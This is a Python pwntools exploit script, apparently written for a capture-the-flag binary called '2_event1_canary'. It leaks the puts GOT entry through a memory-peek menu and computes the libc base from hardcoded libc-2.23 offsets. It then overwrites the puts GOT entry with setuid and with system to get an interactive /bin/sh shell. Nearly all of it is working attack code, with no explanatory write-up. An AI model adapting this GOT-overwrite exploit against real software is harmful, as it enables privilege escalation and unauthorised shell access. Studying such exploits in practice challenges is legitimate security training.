#!/usr/bin/python 

from pwn import * 

time = 0.2

# Starts processs
p = process("./2_event1_canary") 

def main():
	# Skip till `name`
	skip_prompt()
	send_to_stack(hex(0))
	
	# Skip `option` prompt
	skip_prompt()

	# Select option {1} peek memory address
	select_peek_memory()

	# readelf -r ./2_event1_canary | grep puts
	# 0804a020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0

	puts_GOT = 0x0804a020
	log.info("puts GOT : 0x%x" %puts_GOT)
	
	# Determines addr of puts_GOT by peeking
	send_addr_hex(puts_GOT)
	peek_results = p.recvrepeat(time)

	# Extract results
	puts_addr = ""
	puts_addr = extract_hex_addr(peek_results)
	log.info("puts addr : 0x%x" %puts_addr)
	
	# Calculate libc base addr
	# objdump /lib/i386-linux-gnu/libc-2.23.so -d |grep "<_IO_puts@@GLIBC_2.0>"
	# 0005fca0 <_IO_puts@@GLIBC_2.0>:
	puts_offset = 0x0005fca0
	libc_base_addr = puts_addr - puts_offset
	log.info("libc base addr : 0x%x" %libc_base_addr)

	# Calculate /bin/sh addr
	# strings -a -tx /lib/i386-linux-gnu/libc-2.23.so |grep "/bin/sh"
	# 15ba0b /bin/sh
	bin_sh_offset = 0x15ba0b
	bin_sh_addr = libc_base_addr + bin_sh_offset
	log.info("/bin/sh addr : 0x%x" %bin_sh_addr)

	# Calculate setuid addr
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep setuid
	# 000b12e0 <setuid@@GLIBC_2.0>:
	setuid_offset = 0x000b12e0
	setuid_addr = libc_base_addr + setuid_offset 
	log.info("setuid addr : 0x%x" %setuid_addr)

	# Calculate system addr
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so |grep system
	# 0003ada0 <__libc_system@@GLIBC_PRIVATE>:
	system_offset = 0x0003ada0
	system_addr = libc_base_addr + system_offset
	log.info("system addr: 0x%x" %system_addr)

	# Calculate execve addr
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so |grep "<execve@@GLIBC_2.0>:"
	# 000b07e0 <execve@@GLIBC_2.0>:
	execve_offset = 0x000b07e0
	execve_addr = libc_base_addr + execve_offset
	log.info("execve addr: 0x%x" %execve_addr)
	
	# Overwrite with setuid
	select_overwrite()
	overwrite(puts_GOT, setuid_addr)
	
	# Select name and overwrite it with command
	select_name()	
	send_to_stack('/bin/sh')

	# Overwrite with system
	select_overwrite()
	overwrite(puts_GOT, system_addr)

	# For GDB purposes
        #raw_input(str(p.proc.pid))

	# Pass interaction back to user
	p.interactive()

def skip_prompt():
	p.recvrepeat(time)

def overwrite(addr_to_be_overwritten, new_value):
	# Sends the address to be overwritten 
	send_addr_hex(addr_to_be_overwritten)	
	log.info("Addr to be overwritten : 0x%x" %addr_to_be_overwritten)

	# Skips prompt and sends the value to be overwritten
	skip_prompt()
	send_addr_hex(new_value)
	log.warn("Overwriting it with : 0x%x" %new_value)
	skip_prompt()

def extract_hex_addr(peek_results):
	for i in peek_results.split("\n"): # Splits result by newlines
		if "Contents:" in i: # If hex addr is found, perform string operations
			hex_addr = i[ i.find("0x") : len(i) ]			

	hex_addr = int(hex_addr, 16) # Converts hex string to hex
	return hex_addr

def send_addr_hex(addr):
	p.sendline(hex(addr))

def send_to_stack(cmd):
	p.sendline(cmd)
	log.warn("Stored %s on the stack" %cmd)	

def select_peek_memory():
	p.sendline("1")
	skip_prompt()

def select_name():
	p.sendline("2")
	skip_prompt()

def select_overwrite():
	p.sendline("3")
	skip_prompt()

if __name__ == "__main__": 
	main()

